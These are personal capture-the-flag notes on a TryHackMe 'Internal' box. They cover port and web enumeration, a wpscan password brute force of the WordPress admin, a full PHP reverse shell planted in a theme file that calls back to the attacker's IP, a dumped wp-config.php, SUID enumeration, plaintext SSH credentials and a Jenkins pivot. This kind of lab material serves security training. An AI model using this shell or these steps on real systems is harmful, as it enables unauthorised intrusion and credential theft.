Target - ***10.10.227.173***


Set Attack host target `/etc/hosts`
```
#THM Hosts#
#10.10.194.24 cherryontop.thm
#10.10.194.24 nano.cherryontop.thm
#10.10.50.221 bricks.thm
#10.10.148.101 corp.thm
10.10.227.173 internal.thm

```
Enumeration
```bash

─$ rustscan -a 10.10.227.173 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/home/sstephens/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.227.173:22
Open 10.10.227.173:80
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 04:43 EDT
Initiating Ping Scan at 04:43
Scanning 10.10.227.173 [2 ports]
Completed Ping Scan at 04:43, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:43
Completed Parallel DNS resolution of 1 host. at 04:43, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:43
Scanning 10.10.227.173 [2 ports]
Discovered open port 22/tcp on 10.10.227.173
Discovered open port 80/tcp on 10.10.227.173
Completed Connect Scan at 04:43, 0.03s elapsed (2 total ports)
Nmap scan report for 10.10.227.173
Host is up, received syn-ack (0.035s latency).
Scanned at 2024-09-03 04:43:27 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds

```

Web Enum (Automated)
**GOBuster**
#gobuster
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.227.173
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 313] [--> http://10.10.227.173/blog/]
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.227.173/wordpress/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.227.173/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.227.173/phpmyadmin/]
```
**FFUF**
#ffuf

```bash
┌──(sstephens㉿kali-ppt)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.227.173/blog/FUZZ -s

wp-content
#
# Priority ordered case sensative list, where entries were found 
#
# This work is licensed under the Creative Commons 
# directory-list-2.3-medium.txt
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ 
# or send a letter to Creative Commons, 171 Second Street, 
# Attribution-Share Alike 3.0 License. To view a copy of this 
# on atleast 2 different hosts
#
#
# Copyright 2007 James Fisher
# Suite 300, San Francisco, California, 94105, USA.

wp-includes
wp-admin
----------------------------------------------

┌──(sstephens㉿kali-ppt)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.227.173/wordpress/FUZZ -s

wp-content
wp-includes
wp-admin

----------------------------------------------
┌──(sstephens㉿kali-ppt)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.227.173/wordpress/FUZZ -s

wp-content
wp-includes
wp-admin
                                                                                                                                                            
┌──(sstephens㉿kali-ppt)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.227.173/wordpress/wp-content/FUZZ -s

themes

plugins


----------------------------------------------

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.227.173/wordpress/wp-includes/FUZZ -s   

assets


images
css
js
blocks
widgets
fonts
customize
certificates
Text
Requests
----------------------------------------------
```

**Manual**
```
themes/twentyseventeen
```

**WPSCAN**
#WPscan

![[wpscan_blog.txt]]
![[wpscan_contents.txt]]
![[wpscan_admin.txt]]
![[wpscan_includes.txt]]
![[wpscan.txt]]
![[wpscan_e.txt]]
*Found Admin username in wpscan_e results.*

**BURP**

```bash 
# Captured Login Request from our found user name
```

**BruteForce Pass**
#Hydra #WPscan

```bash
hydra 
```

```bash
wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt


#my2boys
```

![[pass_brute.txt]]


Replace index.php in theme file with PHP ReverseShell
#wp_rev_shell_index 

```php
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.11.93.71', 9009);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```


```bash
#┌──(sstephens㉿kali-ppt)-[~/…/Personal_Pentest_Notes/Challenges & CTFs/TryHackme/Internal]
#└─$ nc -lvnp 9009                                                              
#listening on [any] 9009 ...
#connect to [10.11.93.71] from (UNKNOWN) [10.10.227.173] 44252
#SOCKET: Shell has connected! PID: 3095
#whoami
#www-data

```

Read Wordpress-config.php
```
pwd
/var/www/html/wordpress
ls
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'No9]-c] _7M5ae[&|ow)97dfBLUV1G8AakB)?#XIN:W`y4?tgN,DOoC8 mD/)8vh' );
define( 'SECURE_AUTH_KEY',  'xs.zSjNj^a: zpzBLb@r[u65WA9uNd:vLXtLs^>@q38*x.kVxr g,yoGlOpd%Xde' );
define( 'LOGGED_IN_KEY',    'rZU=>v+8g,ey/*Q;c**79^K14&M@2-IDB)DknMf7<a/;hviCw?kRv=MW5lk.vSoG' );
define( 'NONCE_KEY',        '8v={}7jgkSu|D[Nfy]y}>MX}60oSjSMn^qC2rW%V,3|Fg0TJrB6m4}Mb>V@[pZ<w' );
define( 'AUTH_SALT',        'ASOB>S,c3MiYiYSh!;My@BaY7MYRQRI}/~ZC6k?9^e7/jCB00r@Z0)Oe@gQ8Trk*' );
define( 'SECURE_AUTH_SALT', 'd(=umc=!qOCnjIvr~_T_(Ia5.mG6VGF~ktdtt1uzj6A$KJsEAAA5k7.(zFgLa96[' );
define( 'LOGGED_IN_SALT',   '~A,!e|5RGqu!KB=/1R4TN_tcGuK}+]]I_p`FZ[(~L0rv_OY#EItD)tC [hM|l|0z' );
define( 'NONCE_SALT',       'H+T|fK,+u K}_qDTs,ob{,h0TLbd}#pwksNuBzu9~Kw<GcDnJiMYm}[AvPQVTr_,' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

```bash
ls /home
aubreanna
ls /aubreanna

```

Upgrade shell
#stable_shell 
[[Commands Cheat Sheet]] 


SUID Search
#suid
`find / -perm -u=s -type f 2>/dev/null`
```bash
find / -perm -u=s -type f 2>/dev/null   
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/bin/mount
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

**More Manual Enum**
```bash
ls /opt
containerd  wp-save.txt


cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

UserFlag
```
ssh aubreanna@10.10.227.173
bubb13guM!@#123

ls
jenkins.txt  snap  user.txt


cat THM{int3rna1_fl4g_1}
```

Root Pivot
```
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080


aubreanna@internal:~$ ps -aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 159700  8780 ?        Ss   08:37   0:01 /sbin/init may
root         2  0.0  0.0      0     0 ?        S    08:37   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   08:37   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   08:37   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    08:37   0:01 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    08:37   0:01 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    08:37   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    08:37   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    08:37   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    08:37   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    08:37   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   08:37   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    08:37   0:00 [rcu_tasks_kth
root        16  0.0  0.0      0     0 ?        S    08:37   0:00 [kauditd]
root        17  0.0  0.0      0     0 ?        S    08:37   0:00 [xenbus]
root        18  0.0  0.0      0     0 ?        S    08:37   0:00 [xenwatch]
root        19  0.0  0.0      0     0 ?        I    08:37   0:00 [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    08:37   0:00 [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    08:37   0:00 [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   08:37   0:00 [writeback]
root        23  0.0  0.0      0     0 ?        S    08:37   0:00 [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   08:37   0:00 [ksmd]
root        25  0.0  0.0      0     0 ?        SN   08:37   0:00 [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   08:37   0:00 [crypto]
root        27  0.0  0.0      0     0 ?        I<   08:37   0:00 [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   08:37   0:00 [kblockd]
root        29  0.0  0.0      0     0 ?        I<   08:37   0:00 [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   08:37   0:00 [md]
root        31  0.0  0.0      0     0 ?        I<   08:37   0:00 [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   08:37   0:00 [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   08:37   0:00 [watchdogd]
root        36  0.0  0.0      0     0 ?        S    08:37   0:00 [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   08:37   0:00 [kworker/u31:0
root        38  0.0  0.0      0     0 ?        S    08:37   0:00 [ecryptfs-kthr
root        80  0.0  0.0      0     0 ?        I<   08:37   0:00 [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   08:37   0:00 [acpi_thermal_
root        82  0.0  0.0      0     0 ?        S    08:37   0:00 [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   08:37   0:00 [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    08:37   0:00 [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   08:37   0:00 [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   08:37   0:00 [ipv6_addrconf
root       101  0.0  0.0      0     0 ?        I<   08:37   0:00 [kstrp]
root       118  0.0  0.0      0     0 ?        I<   08:37   0:00 [charger_manag
root       189  0.0  0.0      0     0 ?        I<   08:37   0:00 [ttm_swap]
root       214  0.0  0.0      0     0 ?        I<   08:37   0:00 [kdmflush]
root       215  0.0  0.0      0     0 ?        I<   08:37   0:00 [bioset]
root       284  0.0  0.0      0     0 ?        I<   08:37   0:00 [raid5wq]
root       337  0.0  0.0      0     0 ?        S    08:37   0:00 [jbd2/dm-0-8]
root       338  0.0  0.0      0     0 ?        I<   08:37   0:00 [ext4-rsv-conv
root       405  0.0  0.7 127648 15968 ?        S<s  08:37   0:00 /lib/systemd/s
root       415  0.0  0.0      0     0 ?        I<   08:37   0:00 [iscsi_eh]
root       425  0.0  0.0 105904  1828 ?        Ss   08:37   0:00 /sbin/lvmetad 
root       427  0.0  0.2  45832  4424 ?        Ss   08:37   0:00 /lib/systemd/s
root       428  0.0  0.0      0     0 ?        I<   08:37   0:00 [ib-comp-wq]
root       429  0.0  0.0      0     0 ?        I<   08:37   0:00 [ib-comp-unb-w
root       430  0.0  0.0      0     0 ?        I<   08:37   0:00 [ib_mcast]
root       431  0.0  0.0      0     0 ?        I<   08:37   0:00 [ib_nl_sa_wq]
root       432  0.0  0.0      0     0 ?        I<   08:37   0:00 [rdma_cm]
root       438  0.0  0.0      0     0 ?        I<   08:37   0:00 [kworker/0:1H]
root       451  0.0  0.0      0     0 ?        S<   08:37   0:00 [loop0]
root       452  0.0  0.0      0     0 ?        S<   08:37   0:00 [loop1]
root       582  0.0  0.0      0     0 ?        S    08:37   0:00 [jbd2/xvda2-8]
root       583  0.0  0.0      0     0 ?        I<   08:37   0:00 [ext4-rsv-conv
systemd+   608  0.0  0.1 141956  3084 ?        Ssl  08:37   0:00 /lib/systemd/s
systemd+   738  0.0  0.2  80080  5232 ?        Ss   08:37   0:00 /lib/systemd/s
systemd+   757  0.0  0.2  70772  6028 ?        Ss   08:37   0:00 /lib/systemd/s
root       823  0.0  0.1  30104  2808 ?        Ss   08:37   0:00 /usr/sbin/cron
root       828  0.0  0.2  70616  5788 ?        Ss   08:37   0:00 /lib/systemd/s
syslog     829  0.0  0.1 263036  4020 ?        Ssl  08:37   0:00 /usr/sbin/rsys
message+   831  0.0  0.2  50060  4376 ?        Rs   08:37   0:00 /usr/bin/dbus-
root       843  0.0  0.1 621620  2180 ?        Ssl  08:37   0:00 /usr/bin/lxcfs
root       848  0.0  0.3 286452  6500 ?        Ssl  08:37   0:00 /usr/lib/accou
daemon     849  0.0  0.1  28332  2108 ?        Ss   08:37   0:00 /usr/sbin/atd 
root       850  0.0  0.8 169188 16812 ?        Ssl  08:37   0:00 /usr/bin/pytho
root       856  0.0  1.4 639036 28556 ?        Ssl  08:37   0:01 /usr/lib/snapd
root       858  0.0  2.0 672560 41608 ?        Ssl  08:37   0:05 /usr/bin/conta
root       869  0.0  0.2  72300  6076 ?        Ss   08:37   0:00 /usr/sbin/sshd
root       870  0.0  0.9 186028 19788 ?        Ssl  08:37   0:00 /usr/bin/pytho
root       877  0.0  4.1 839316 84072 ?        Ssl  08:37   0:01 /usr/bin/docke
root       879  0.0  0.0  14768  2028 ttyS0    Ss+  08:37   0:00 /sbin/agetty -
root       880  0.0  0.0  13244  1724 tty1     Ss+  08:37   0:00 /sbin/agetty -
root       923  0.0  0.3 291452  6988 ?        Ssl  08:37   0:00 /usr/lib/polic
root      1045  0.0  1.2 489804 24548 ?        Ss   08:37   0:00 /usr/sbin/apac
mysql     1047  0.0 11.1 1165472 227444 ?      Sl   08:37   0:08 /usr/sbin/mysq
root      1390  0.0  0.1 404800  3496 ?        Sl   08:37   0:00 /usr/bin/docke
root      1415  0.0  0.2   9364  5704 ?        Sl   08:37   0:00 containerd-shi
aubrean+  1443  0.0  0.0   1148     4 ?        Ss   08:37   0:00 /sbin/tini -- 
aubrean+  1483  0.6 12.5 2587808 255104 ?      Sl   08:37   1:29 java -Duser.ho
aubrean+  1535  0.0  0.0      0     0 ?        Z    08:37   0:00 [jenkins.sh] <
www-data  2599  0.0  2.0 570044 41672 ?        S    09:10   0:02 /usr/sbin/apac
www-data  2621  0.0  2.1 570460 42900 ?        S    09:10   0:02 /usr/sbin/apac
www-data  2628 12.4  2.2 574136 46220 ?        S    09:10  22:54 /usr/sbin/apac
www-data  2653  0.0  2.0 569980 41412 ?        S    09:24   0:02 /usr/sbin/apac
www-data  2861  0.0  1.8 569788 38472 ?        S    10:19   0:02 /usr/sbin/apac
www-data  2875  0.0  2.0 570324 41908 ?        S    10:20   0:02 /usr/sbin/apac
www-data  2880  0.0  1.9 571876 39032 ?        S    10:20   0:02 /usr/sbin/apac
www-data  2980  0.0  2.1 572840 44728 ?        S    10:50   0:02 /usr/sbin/apac
www-data  3070  0.0  1.8 571620 38440 ?        S    11:15   0:02 /usr/sbin/apac
www-data  3071 39.0  2.0 571936 42344 ?        R    11:15  22:59 /usr/sbin/apac
root      3091  0.0  0.0      0     0 ?        I    11:26   0:00 [kworker/u30:1
www-data  3095  0.0  0.0   4628   860 ?        S    11:28   0:00 sh -c sh
www-data  3096  0.0  0.0   4628  1648 ?        S    11:28   0:00 sh
www-data  3216  0.0  0.3  33116  7004 ?        S    11:46   0:00 python -c impo
www-data  3217  0.0  0.0  18508  1872 pts/0    Ss+  11:46   0:00 /bin/bash
www-data  3221  0.0  0.0   4628   908 ?        S    11:51   0:00 sh -c sh
www-data  3222  0.0  0.0   4628   764 ?        S    11:51   0:00 sh
www-data  3223  0.0  0.3  33244  6836 ?        S    11:51   0:00 python -c impo
www-data  3224  0.0  0.0  18508  1996 pts/1    Ss+  11:51   0:00 /bin/bash
root      3276  0.0  0.0      0     0 ?        I    12:04   0:00 [kworker/0:0]
root      3300  0.0  0.0      0     0 ?        R    12:07   0:00 [kworker/u30:0
root      3305  0.0  0.3 105688  6920 ?        Ss   12:08   0:00 sshd: aubreann
aubrean+  3309  0.0  0.3  76692  7792 ?        Ss   12:08   0:00 /lib/systemd/s
aubrean+  3310  0.0  0.1 193680  2424 ?        S    12:08   0:00 (sd-pam)
aubrean+  3450  0.0  0.2 107984  5160 ?        S    12:08   0:00 sshd: aubreann
aubrean+  3451  0.0  0.2  21568  4792 pts/2    Ss   12:08   0:00 -bash
root      3570  0.0  0.0      0     0 ?        I    12:13   0:00 [kworker/0:2]
aubrean+  3613  0.0  0.1  38448  3572 pts/2    R+   12:14   0:00 ps -aux
aubreanna@internal:~$ ps -aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 159700  8780 ?        Ss   08:37   0:01 /sbin/init maybe-ubiquity
root         2  0.0  0.0      0     0 ?        S    08:37   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   08:37   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   08:37   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    08:37   0:01 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    08:37   0:01 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    08:37   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    08:37   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    08:37   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    08:37   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    08:37   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   08:37   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    08:37   0:00 [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    08:37   0:00 [kauditd]
root        17  0.0  0.0      0     0 ?        S    08:37   0:00 [xenbus]
root        18  0.0  0.0      0     0 ?        S    08:37   0:00 [xenwatch]
root        19  0.0  0.0      0     0 ?        I    08:37   0:00 [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    08:37   0:00 [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    08:37   0:00 [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   08:37   0:00 [writeback]
root        23  0.0  0.0      0     0 ?        S    08:37   0:00 [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   08:37   0:00 [ksmd]
